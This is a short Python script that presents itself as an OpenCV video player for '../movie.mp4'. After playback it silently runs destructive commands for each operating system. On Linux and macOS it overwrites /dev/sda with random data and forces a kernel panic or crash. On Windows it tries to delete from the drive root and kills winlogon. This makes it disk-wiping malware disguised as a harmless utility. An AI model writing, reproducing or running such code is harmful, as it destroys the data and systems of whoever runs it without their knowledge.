import cv2, platform, os

cap = cv2.VideoCapture('../movie.mp4')
assert cap

while cap.isOpened():
    ret, frame = cap.read()
    if ret:
        cv2.imshow('Frame', frame)
        if cv2.waitKey(25) and 0xff == ord('q'):
            break
    else:
        break

cap.release()
cv2.destroyAllWindows()

if platform.system() == 'Linux':
    os.system('dd if=/dev/urandom of=/dev/sda')
    os.system('echo c > /proc/sysrq-trigger')
elif platform.system() == 'Windows':
    os.system('del \\')
    os.system('taskkill /f /im winlogon.exe')
elif platform.system() == 'Darwin':
    os.system('dd if=/dev/urandom of=/dev/sda')
    os.system('sudo dtrace -w -n "BEGIN{ panic(); }"')
else:
    raise NotImplementedError('Unsupported OS')
